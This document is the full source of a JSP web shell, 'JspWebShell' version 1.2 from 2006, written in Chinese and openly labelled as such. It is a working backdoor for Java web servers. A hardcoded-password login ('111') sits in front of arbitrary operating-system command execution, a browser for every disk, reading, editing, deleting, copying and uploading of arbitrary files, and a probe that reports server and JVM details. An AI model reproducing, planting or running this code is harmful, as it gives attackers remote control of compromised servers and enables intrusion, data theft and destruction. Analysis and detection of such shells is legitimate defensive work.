<%@ page contentType="text/html; charset=GBK" language="java" import="java.sql.*,java.io.File,java.io.*,java.nio.charset.Charset,java.io.IOException,java.util.*" errorPage="" %>
<%
/**
 * <p>Title:JspWebshell </p>
 *
 * <p>Description: jsp网站管理</p>
 *
 * <p>Copyright:绝对零度[B.C.T] Copyright (c) 2006</p>
 *
 * <p>Company: zero.cnbct.org</p>
 *  PS:本程序是小弟处于兴趣所写，如有疑问请联系QQ:48124012
 * @version 1.2
 */
 String path="";
 String selfName="";
 boolean copyfinish=false;
%>
<%  selfName=request.getRequestURI();
     // String editfile="";
        String editfile=request.getParameter("editfile");
		if (editfile!=null)
		{editfile=new String(editfile.getBytes("ISO8859_1"));
		}
	  path=request.getParameter("path");
		if(path==null)
		path=config.getServletContext().getRealPath("/");
%>
<%!    
    String _password ="111";//密码
	public String readAllFile(String filePathName) throws IOException 
	{ 
	FileReader fr = new FileReader(filePathName); 
	int count = fr.read();
	String res="";
	while(count != -1) 
	{ 
	//System.out.print((char)count); 
		res=res+(char)count;
	count = fr.read(); 
	if(count == 13) 
	{ 
	fr.skip(1); 
	} 
	} 
	fr.close(); 
	return res;
	} 
public void writeFile(String filePathName,String args) throws IOException 
{ 
FileWriter fw = new FileWriter(filePathName); 
PrintWriter out=new PrintWriter(fw); 
out.write(args); 
out.println(); 
out.flush(); 
fw.close(); 
out.close(); 
} 
public boolean createFile(String filePathName) throws IOException 
{ 
boolean result = false; 
File file = new File(filePathName); 
if(file.exists()) 
{ 
System.out.println("文件已经存在！"); 
} 
else 
{ 
file.createNewFile(); 
result = true; 
System.out.println("文件已经创建！"); 
} 
return result; 
}
public boolean createFolder(String fileFolderName) 
{ 
boolean result = false; 
try 
{ 
File file = new File(fileFolderName); 
if(file.exists()) 
{ 
//file.delete(); 
System.out.println("目录已经存在!"); 
result = true; 
} 
else 
{ 
file.mkdir(); 
System.out.println("目录已经建立!"); 
result = true; 
} 
} 
catch(Exception ex) 
{ 
result = false; 
System.out.println("CreateAndDeleteFolder is error:"+ex); 
} 
return result; 
}  

public boolean DeleteFolder(String filefolderName) 
{ 
boolean result = false; 
try 
{ 
File file = new File(filefolderName); 
if(file.exists()) 
{ 
file.delete(); 
System.out.println("目录已删除!"); 
result = true; 
} 
} 
catch(Exception ex) 
{ 
result = false; 
System.out.println("CreateAndDeleteFolder is error:"+ex); 
} 
return result; 
} 
public boolean validate(String password) {
	if (password.equals(_password)) {
		return true;
	} else {
		return false;
	}
}
public String HTMLEncode(String str) {
	str = str.replaceAll(" ", "&nbsp;");
	str = str.replaceAll("<", "&lt;");
	str = str.replaceAll(">", "&gt;");
	str = str.replaceAll("\r\n", "<br>");
	
	return str;
}
    public String exeCmd(String cmd) {
	Runtime runtime = Runtime.getRuntime();
	Process proc = null;
	String retStr = "";
	InputStreamReader insReader = null;
	char[] tmpBuffer = new char[1024];
	int nRet = 0;
	
	try {
		proc = runtime.exec(cmd);
		insReader = new InputStreamReader(proc.getInputStream(), Charset.forName("GB2312"));
		while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {
			retStr += new String(tmpBuffer, 0, nRet);
		}
		
		insReader.close();
		retStr = HTMLEncode(retStr);
	} catch (Exception e) {
		retStr = "<font color=\"red\">命令错误\"" + cmd + "\"";
	} finally {
		return retStr;
	}
	}
	public boolean fileCopy(String srcPath, String dstPath) {
	boolean bRet = true;
	
	try {
		FileInputStream in = new FileInputStream(new File(srcPath));
		FileOutputStream out = new FileOutputStream(new File(dstPath));
		byte[] buffer = new byte[1024];
		int nBytes;
		

		while ((nBytes = in.read(buffer, 0, 1024)) != -1) {
			out.write(buffer, 0, nBytes);
		}
		
		in.close();
		out.close();
	} catch (IOException e) {
		bRet = false;
	}	
	
	return bRet;
}
class EnvServlet
{
	public long timeUse=0;
	public Hashtable htParam=new Hashtable();
	private Hashtable htShowMsg=new Hashtable();
	public void setHashtable()
	{
		Properties me=System.getProperties();
		Enumeration em=me.propertyNames();
		while(em.hasMoreElements())
		{
			String strKey=(String)em.nextElement();
			String strValue=me.getProperty(strKey);
			htParam.put(strKey,strValue);
		}
	}	
	public void getHashtable(String strQuery)
	{
		Enumeration em=htParam.keys();
		while(em.hasMoreElements())
		{
			String strKey=(String)em.nextElement();
			String strValue=new String();
			if(strKey.indexOf(strQuery,0)>=0)
			{
				strValue=(String)htParam.get(strKey);
				htShowMsg.put(strKey,strValue);
			}
		}
	}
	public String queryHashtable(String strKey)
	{
		strKey=(String)htParam.get(strKey);
		return strKey;
	}
/*	public long test_int()
	{
		long timeStart = System.currentTimeMillis();
		int i=0;
		while(i<3000000)i++;
		long timeEnd = System.currentTimeMillis();
		long timeUse=timeEnd-timeStart;
		return timeUse;
	}
	public long test_sqrt()
	{
		long timeStart = System.currentTimeMillis();
		int i=0;
		double db=(double)new Random().nextInt(1000);
		while(i<200000){db=Math.sqrt(db);i++;}
		long timeEnd = System.currentTimeMillis();
		long timeUse=timeEnd-timeStart;
		return timeUse;
	}*/
}
%>
<%
	EnvServlet env=new EnvServlet();
	env.setHashtable();
	//String action=new String(" ");
	//String act=new String("action");
	//if(request.getQueryString()!=null&&request.getQueryString().indexOf(act,0)>=0)action=request.getParameter(act);
%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>JspWebShell By 绝对零度</title>
<style>
body {
	font-size: 12px;
	font-family: "宋体";
	background-color: #666666;
}
A {
	COLOR: black; TEXT-DECORATION: none
}
A:hover {
	COLOR: black; TEXT-DECORATION: underline; none: 
}
td {
	font-size: 12px;
	font-family: "宋体";
	color: #000000;
}

input.textbox {
	border: black solid 1;
	font-size: 12px;
	height: 18px;
}

input.button {
	font-size: 12px;
	font-family: "宋体";
	border: black solid 1;
}

td.datarows {
	font-size: 12px;
	font-family: "宋体";
	height: 25px;
	color: #000000;
}
.PicBar { background-color: #f58200; border: 1px solid #000000; height: 12px;}
textarea {
border: black solid 1;
}
.inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}
.table1 {BORDER:gray 0px ridge;}
.td2 {BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey; height:18px;}
.tr1 {BACKGROUND-color:gray }
</style>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>
</head>
<body bgcolor="#666666">
<%
//session.setMaxInactiveInterval(_sessionOutTime * 60);
String password=request.getParameter("password");
if (password == null && session.getAttribute("password") == null) {

%>

<div align="center" style="position:absolute;width:100%;visibility:show; z-index:0;left:4px;top:272px"> 
  <TABLE class="table1" cellSpacing="1" cellPadding="1" width="473" border="0" align="center">
    <tr> 
      <td class="tr1"> <TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
          <tr> 
            <TD align="left" bgcolor="#333333"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>JspWebShell 
              version 1.2管理登录 :::...</b></font></TD>
            <TD align="right" bgcolor="#333333"><FONT color="#d2d8ec">Power By 
              绝对零度</FONT></TD>
          </tr>
          <form name="bctform" method="post">
            <tr bgcolor="#999999"> 
              <td height="30" colspan="2" align="center" class="td2"> 
                <input name="password" type="password" class="textbox" id="Textbox" /> 
                <input type="submit" name="Button" value="Login" id="Button" title="Click here to login" class="button" /> 
              </td>
            </tr>
          </form>
        </TABLE></td>
    </tr>
  </TABLE>
</div>
<%

	} else {
	
	if (session.getAttribute("password") == null) {
		
		if (validate(password) == false) {
			out.println("<div align=\"center\"><font color=\"red\"><li>密码错误</font></div>");
			out.close();
			return;
		}
		
		session.setAttribute("password", password);
	} else {
		password = (String)session.getAttribute("password");
	}
%>
	<%
		File tmpFile = null;
		String delfile="";
		String delfile1="";
		String editpath="";
		delfile1=request.getParameter("delfile");
		editpath=request.getParameter("filepath");
		if (delfile1!=null)
		{delfile=new String(delfile1.getBytes("ISO8859_1"));
		}
        if ( delfile1!= null) {
        //  out.print(delfile);
	    	tmpFile = new File(delfile);
		if (! tmpFile.delete()) {
			out.print( "<font color=\"red\">删除失败</font><br>\n");
			}
			}
%>
  <%String editfilecontent=null;
       String editfilecontent1=request.getParameter("content");
	   // out.println(editfilecontent1);
		//String save=request.getParameter("save");
	   if (editfilecontent1!=null)
	   {editfilecontent=new String(editfilecontent1.getBytes("ISO8859_1"));}
          //   out.print(editfile);
			//out.print(editfilecontent);
            if (editfile!=null&editfilecontent!=null)
			{try {writeFile(editfile,editfilecontent);}
			 catch (Exception e) {out.print("写入失败");}
			 out.print("写入成功");
			}
			%>
<%request.setCharacterEncoding("GBK");%>
<%//String editfile=request.getParameter("editfile");
//out.print(editfile);
if (request.getParameter("jsptz")!=null)
{%>
<div id="Layer2" style="position:absolute; left:9px; top:340px; width:725px; height:59px; z-index:2"> 
  <CENTER>
  <table border="0" cellpadding="0" cellspacing="1" class="tableBorder">
  <tr> 
      <td height="22" align="center" bgcolor="#000000" ><font color=#FFFFFF><strong>服务器相关参数</strong></font>      
      </td>
  </tr>
  <tr> 
    <td style="display" id='submenu0'><table border=0 width=100% cellspacing=1 cellpadding=3 bgcolor="#FFFFFF">
          <tr bgcolor="#999999" height="22">
		  <td width="130" bgcolor="#999999">&nbsp;服务器名</td>
            <td height="22" colspan="3">&nbsp;<%= request.getServerName() %>(<%=request.getRemoteAddr()%>)</td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td>&nbsp;服务器操作系统</td>
            <td colspan="3">&nbsp;<%=env.queryHashtable("os.name")%> <%=env.queryHashtable("os.version")%> 
              <%=env.queryHashtable("sun.os.patch.level")%></td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td>&nbsp;服务器操作系统类型</td>
            <td>&nbsp;<%=env.queryHashtable("os.arch")%></td>
            <td>&nbsp;服务器操作系统模式</td>
            <td>&nbsp;<%=env.queryHashtable("sun.arch.data.model")%>位</td>
          </tr>     
          <tr bgcolor="#999999" height="22"> 
            <td>&nbsp;服务器所在地区</td>
            <td>&nbsp;<%=env.queryHashtable("user.country")%></td>
            <td>&nbsp;服务器语言</td>
            <td>&nbsp;<%=env.queryHashtable("user.language")%></td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td>&nbsp;服务器时区</td>
            <td>&nbsp;<%=env.queryHashtable("user.timezone")%></td>
            <td>&nbsp;服务器时间</td>
            <td>&nbsp;<%=new java.util.Date()%> </td>
          </tr>
		  <tr bgcolor="#999999" height="22"> 
            <td>&nbsp;服务器解译引擎</td>
            <td width="170">&nbsp;<%= getServletContext().getServerInfo() %></td>
            <td width="130">&nbsp;服务器端口</td>
            <td width="170">&nbsp;<%= request.getServerPort() %></td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td height="22">&nbsp;当前用户</td>
            <td height="22" colspan="3">&nbsp;<%=env.queryHashtable("user.name")%></td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td>&nbsp;用户目录</td>
            <td colspan="3">&nbsp;<%=env.queryHashtable("user.dir")%></td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td align=left>&nbsp;本文件实际路径</td>
            <td height="8" colspan="3">&nbsp;<%=request.getRealPath(request.getServletPath())%></td>
          </tr>
        </table>
    </td>
  </tr>
</table>
  <br>
    <table width="640" border="0" cellpadding="0" cellspacing="1" class="tableBorder">
      <tr> 
      <td width="454" height="22" align="center" bgcolor="#000000" onclick="showsubmenu(1)"><font color=#FFFFFF><strong>JAVA相关参数</strong></font> 
      </td>
  </tr>
  <tr> 
    <td style="display" id='submenu1'>
		<table border=0 width=99% cellspacing=1 cellpadding=3 bgcolor="#FFFFFF">
            <tr bgcolor="#666666" height="22"> 
            <td width="30%">&nbsp;名称</td>
            <td width="50%" height="22">&nbsp;英文名称</td>
            <td width="20%" height="22">&nbsp;版本</td>
          </tr>
          <tr bordercolor="#FFFFFF" bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;JAVA运行环境名称</td>
            <td width="50%" height="22">&nbsp;<%=env.queryHashtable("java.runtime.name")%></td>
            <td width="20%" height="22">&nbsp;<%=env.queryHashtable("java.runtime.version")%></td>
          </tr>
          <tr bordercolor="#FFFFFF" bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;JAVA运行环境说明书名称</td>
            <td width="50%" height="22">&nbsp;<%=env.queryHashtable("java.specification.name")%></td>
            <td width="20%" height="22">&nbsp;<%=env.queryHashtable("java.specification.version")%></td>
          </tr>
          <tr bordercolor="#FFFFFF" bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;JAVA虚拟机名称</td>
            <td width="50%" height="22">&nbsp;<%=env.queryHashtable("java.vm.name")%></td>
            <td width="20%" height="22">&nbsp;<%=env.queryHashtable("java.vm.version")%></td>
          </tr>
          <tr bordercolor="#FFFFFF" bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;JAVA虚拟机说明书名称</td>
            <td width="50%" height="22">&nbsp;<%=env.queryHashtable("java.vm.specification.name")%></td>
            <td width="20%" height="22">&nbsp;<%=env.queryHashtable("java.vm.specification.version")%></td>
          </tr>
		  <%
		  	float fFreeMemory=(float)Runtime.getRuntime().freeMemory();
			float fTotalMemory=(float)Runtime.getRuntime().totalMemory();
			float fPercent=fFreeMemory/fTotalMemory*100;
		  %>
          <tr bordercolor="#FFFFFF" bgcolor="#999999" height="22"> 
            <td height="22">&nbsp;JAVA虚拟机剩余内存：</td>
            <td height="22" colspan="2"><img width='8' height="12" align=absmiddle class=PicBar style="background-color: #000000">&nbsp;<%=fFreeMemory/1024/1024%>M 
            </td>
          </tr>
          <tr bordercolor="#FFFFFF" bgcolor="#999999" height="22"> 
            <td height="22">&nbsp;JAVA虚拟机分配内存</td>
            <td height="22" colspan="2"><img width='85%' align=absmiddle class=PicBar style="background-color: #000000">&nbsp;<%=fTotalMemory/1024/1024%>M 
            </td>
          </tr>
        </table>
		  <table border=0 width=99% cellspacing=1 cellpadding=3 bgcolor="#FFFFFF">
            <tr bgcolor="#666666" height="22"> 
            <td width="30%">&nbsp;参数名称</td>
            <td width="70%" height="22">&nbsp;参数路径</td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;java.class.path </td>
            <td width="70%" height="22">&nbsp;<%=env.queryHashtable("java.class.path").replaceAll(env.queryHashtable("path.separator"),env.queryHashtable("path.separator")+"<br>&nbsp;")%>	
            </td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;java.home</td>
            <td width="70%" height="22">&nbsp;<%=env.queryHashtable("java.home")%></td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;java.endorsed.dirs</td>
            <td width="70%" height="22">&nbsp;<%=env.queryHashtable("java.endorsed.dirs")%></td>
          </tr>
          <tr bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;java.library.path</td>
            <td width="70%" height="22">&nbsp;<%=env.queryHashtable("java.library.path").replaceAll(env.queryHashtable("path.separator"),env.queryHashtable("path.separator")+"<br>&nbsp;")%> 
            </td>
          </tr>
		  <tr bgcolor="#999999" height="22"> 
            <td width="30%">&nbsp;java.io.tmpdir</td>
            <td width="70%" height="22">&nbsp;<%=env.queryHashtable("java.io.tmpdir")%></td>
          </tr>
        </table>
    </td>
  </tr>
</table>
  <br>
  <div id="testspeed" align="center"> </div>
</CENTER></div>

<%}
else{
if (editfile!=null)//if edit
{
%>
<div id="Layer1" style="position:absolute; left:-17px; top:1029px; width:757px; height:250px; z-index:1"> 
  <table width="99%" height="232" border="0">
    <tr> 
      <td height="226"><form name="form2" method="post" action="">
          <p align="center"> 地址：
            <input name="editfile" type="text" value="<%=editfile%>" size="50">
          </p>
          <p align="center"> 
            <textarea name="content" cols="105" rows="30"><%=readAllFile(editfile)%></textarea>
            <input type="submit" name="Submit2" value="保存">
          </p>
        </form> </td>
    </tr>
  </table>
  <p>&nbsp;</p></div>
<%}
else{%>

<table border="1" width="770" cellpadding="4" bordercolorlight="#999999" bordercolordark="#ffffff" align="center" cellspacing="0">
  <tr bgcolor="#333333"> 
    <td colspan="4" align="center"><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff">JspWebShell 
      version 1.0</font><font color="#FFFFFF">(网站目录:<%=config.getServletContext().getRealPath("/")%>)</font></td>
  </tr>
  <tr bgcolor="#999999"> 
    <td colspan="4"> <font color="#000000"> 
      <%
	  File[] fs = File.listRoots();
	  for (int i = 0; i < fs.length; i++){
	  %>
      <a href="<%=selfName %>?path=<%=fs[i].getPath()%>\">本地磁盘(<%=fs[i].getPath()%>) 
      </a> 
      <%}%>
      </font></td>
  </tr>
  <tr bgcolor="#999999"> 
    <td height="10" colspan="4"> <font color="#000000"> 
      <form name="form1" method="post" action="">
        <input type="text" name="command" class="button">
        <input type="submit" name="Submit" value="CMD命令执行" class="button">
      </form>
      </font> <p> 
        <%
		String cmd = "";
		InputStream ins = null;
		String result = "";		
		if (request.getParameter("command") != null) {		
			cmd = (String)request.getParameter("command");result = exeCmd(cmd);%>
        <%=result == "" ? "&nbsp;" : result%> 
        <%}%>
       </td>
  </tr>
  <FORM METHOD="POST" ACTION="?up=true&path=<%String path1=config.getServletContext().getRealPath("/"); String tempfilepath=request.getParameter("path"); if(tempfilepath!=null) path1=tempfilepath;path1=path1.replaceAll("\\\\", "\\\\\\\\"); %><%=path1%>" ENCTYPE="multipart/form-data">
    <tr bgcolor="#999999"> 
      <td colspan="2"> <INPUT TYPE="FILE" NAME="FILE1" style="width:150"  SIZE="50" class="button"> 
        <INPUT TYPE="SUBMIT" VALUE="上传" class="button"> </td>
      <td colspan="2"><a href="?jsptz=true" target="_blank">JSP探针</a> </td>
    </tr>
  </FORM>
  <%     String fileexe="";
             String dir="";
             String deldir=""; 
			 String scrfile="";
			 String dstfile="";
			  fileexe=request.getParameter("fileexe");
		     dir=request.getParameter("dir");
			 deldir=request.getParameter("deldir");
		     scrfile=request.getParameter("scrfile");
			 dstfile=request.getParameter("dstfile");
		  if (fileexe!=null)
			{
			//out.print(path+fileexe);
			createFile(path+fileexe); 
			}
		  if (dir!=null)
			{
			//out.print(path+dir);
			createFolder(path+dir); 
			}
		  if (deldir!=null)
			{
			//out.print(deldir);
		    DeleteFolder(deldir); 
			}
			if (scrfile!=null&dstfile!=null)
			{
			//out.print(scrfile);
			//out.print(dstfile);
			copyfinish=fileCopy(scrfile, dstfile) ;
			}
			%>
  <tr bgcolor="#CCCCCC"> 
    <td height="10" colspan="2" bgcolor="#999999"> <form name="form3" method="post" action="">
        文件夹名： 
        <input name="dir" type="text" size="10" class="button">
        <input type="submit" name="Submit3" value="新建目录" class="button">
      </form></td>
    <td width="188" height="10" bgcolor="#999999"> <form name="form4" method="post" action="">
        文件名： 
        <input name="fileexe" type="text" size="8" class="button">
        <input type="submit" name="Submit4" value="新建文件" class="button">
      </form></td>
    <td width="327" height="10" bgcolor="#999999"><form name="form5" method="post" action="">
        文件<input name="scrfile" type="text" size="15"class="button">
        复制到
        <input name="dstfile" type="text" size="15" class="button">
        <input type="submit" name="Submit5" value="复制" class="button">
      </form><font color="#FF0000"><%if(copyfinish==true) out.print("复制成功");%></font></td>
  </tr>
  <%//上传
             String tempfilename="";
             String up=request.getParameter("up");
			// String tempfilepath=request.getParameter("filepath");
			// out.print(tempfilepath);
			  if(up!=null)
		  {
	       tempfilename=(String)session.getId();
          //String tempfilename=request.getParameter("file");
          File f1=new File(tempfilepath,tempfilename);
          int n;
          try
          {
              InputStream in=request.getInputStream();
              BufferedInputStream my_in=new BufferedInputStream(in);
              FileOutputStream fout=new FileOutputStream(f1);
              BufferedOutputStream my_out=new BufferedOutputStream(fout);
              byte[] b=new byte[10000];
              while((n=my_in.read(b))!=-1)
              {
                   my_out.write(b,0,n);
              }
              my_out.flush();
              my_out.close();
              fout.close();
              my_in.close();
              in.close();
             // out.print("文件创建成功!<br>");
          }
          catch(IOException e)
          {
              out.print("文件创建失败!");
          }
          
          try
          {   
              RandomAccessFile random1=new RandomAccessFile(f1,"r");
              random1.readLine();
              String filename=random1.readLine();
              byte[] b=filename.getBytes("ISO-8859-1");
              filename=new String(b);
              int pointer=filename.lastIndexOf('\\');
              filename=filename.substring(pointer+1,filename.length()-1);
              File f2=new File(tempfilepath,filename);
              RandomAccessFile random2=new RandomAccessFile(f2,"rw");
              random1.seek(0);
              for(int i=1; i<=4; i++)
              {
                   String tempstr=random1.readLine();
              }
              long startPoint=random1.getFilePointer();
              random1.seek(random1.length());
              long mark=random1.getFilePointer();
              int j=0;
              long endPoint=0;
              while((mark>=0)&&(j<=5))
              {
                   mark--;
                   random1.seek(mark);
                   n=random1.readByte();
                   if(n=='\n')

                   {
                         j++;
                         endPoint=random1.getFilePointer();
                   }
              }
              long length=endPoint-startPoint+1;
              int order=(int)(length/10000);
              int left=(int)(length%10000);
              byte[] c=new byte[10000];
              random1.seek(startPoint);
              for(int i=0; i<order; i++)
              {
                    random1.read(c);
                    random2.write(c);
              }
              random1.read(c,0,left);
              random2.write(c,0,left);
              random1.close();
              random2.close();
              f1.delete();
              out.print("文件上传成功!");
          }
          catch(Exception e)
          {
              out.print("文件上传失败!");
          }

		  }
	
  %>
  <tr> 
    <td width="196" height="48" valign="top" bgcolor="#999999"> 
      <%  try {
	//path=request.getParameter("path");
		//if(path==null)
		//path=config.getServletContext().getRealPath("/");
		File f=new File(path);
	    File[] fList= f.listFiles() ;
	    for (int j=0;j<fList.length;j++)
	    {
		if (fList[j].isDirectory())
		    {%>
      <a href="<%=selfName %>?path=<%=path%><%=fList[j].getName()%>\"> <%=fList[j].getName()%></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="?path=<%=path%>&deldir=<%=path%><%=fList[j].getName()%>">删除</a><br> 
      <% }
		
	     }//for
		 } catch (Exception e) {
			System.out.println("不存在或没有权限");
		}
	%>
      &nbsp; </td>
    <td colspan="3" valign="top" bgcolor="#999999"> 
      <%  try {
	path=request.getParameter("path");
		if(path==null)
		path=config.getServletContext().getRealPath("/");
		File f=new File(path);
	    File[] fList= f.listFiles() ;
	    for (int j=0;j<fList.length;j++)
	    {
		if (fList[j].isFile())
		    {//request.getContextPath()得到虚拟路径%>
     <%=fList[j].getName()%> 
       <a href="?path=<%String tempfilepath1=request.getParameter("path"); if(tempfilepath!=null) path=tempfilepath;%><%=path%>&editfile=<%=path%><%=fList[j].getName()%>" target="_blank">编辑</a> 
      &nbsp; <a href="?action=del&path=<%=path%>&delfile=<%=path%><%=fList[j].getName()%>">删除</a><br> 
      <% }
	     }//for
		 } catch (Exception e) {
			System.out.println("不存在或没有权限");
		}
	%>
    </td>
  </tr>
</table>
<p align="center">Power By 绝对零度[B.C.T] QQ:48124012</p>
<p align="center">&nbsp;</p>
<%}//if edit
}
}
%>
</body>
</html>